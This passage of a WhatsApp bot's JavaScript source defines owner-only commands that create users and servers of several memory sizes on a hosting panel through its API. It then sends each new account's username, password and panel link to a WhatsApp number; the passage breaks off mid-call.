 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "3024"; // Memori unlimited
 let cpu = "2000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "4024"; // Memori unlimited
 let cpu = "3000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *D'Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "5024"; // Memori unlimited
 let cpu = "4000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '1gb-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `);
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : *KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb-2': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '1gb-3': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 Killua Official market | secure 〽️* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : KilluaDev*`;

 await dhikaXs.sendMessage(u, {
